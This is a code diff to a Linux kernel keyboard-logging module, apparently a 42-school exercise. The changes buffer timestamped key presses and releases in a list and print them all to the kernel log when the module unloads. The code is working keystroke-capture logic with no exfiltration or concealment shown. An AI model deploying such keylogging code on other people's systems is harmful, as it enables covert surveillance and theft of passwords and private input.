@@ -16,6 +16,8 @@
 
 extern const struct s_key keys_table[];
 
+LIST_HEAD(keystroke_list);
+
 static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
 {
 	return 0;
@@ -44,10 +46,9 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
 	ktime_get_real_ts64(&ts);
 	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
-
-	pr_info("%02d:%02d:%02d %s (%llu) %s\n", stroke->tm.tm_hour, stroke->tm.tm_min, stroke->tm.tm_sec,
-			stroke->key.name, stroke->key.keycode, param->down ? "pressed" : "released");
-	kfree(stroke); ///// to remove later for fuck's sake
+	stroke->down = param->down;
+	list_add_tail(&stroke->list, &keystroke_list);
+	//kfree(stroke); ///// to remove later for fuck's sake
 	return NOTIFY_OK;
 }
 
@@ -69,10 +70,28 @@ static int __init dni_init(void)
 	return 0;
 }
 
+static void	cleanup_logs(void)
+{
+	struct s_keystroke	*cursor, *tmp;
+
+	list_for_each_entry_safe(cursor, tmp, &keystroke_list, list) {
+		list_del(&cursor->list);
+		kfree(cursor);
+	}
+}
+
 static void __exit dni_exit(void)
 {
+	struct s_keystroke	*cursor;
+
 	misc_deregister(&device);
 	unregister_keyboard_notifier(&keyboard_nb);
+	list_for_each_entry(cursor, &keystroke_list, list) {
+		pr_info("%02d:%02d:%02d %s (%llu) %s\n",
+			cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
+			cursor->key.name, cursor->key.keycode, cursor->down ? "pressed" : "released");
+	}
+	cleanup_logs();
 	pr_info("bye from the 42 keylogger\n");
 }
 
